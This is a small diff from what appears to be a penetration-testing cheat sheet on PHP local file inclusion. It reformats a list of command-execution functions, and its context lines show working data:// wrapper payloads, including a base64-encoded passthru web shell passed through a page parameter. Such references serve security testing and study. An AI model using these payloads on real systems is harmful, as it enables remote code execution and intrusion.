@@ -299,11 +299,11 @@
 	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=
 	If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
 	Code execution with 
-		- exec
-		- shell_exec
-		- system
-		- passthru
-		- popen
+	exec
+	shell_exec
+	system
+	passthru
+	popen
 	\# Example
 	echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
 	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
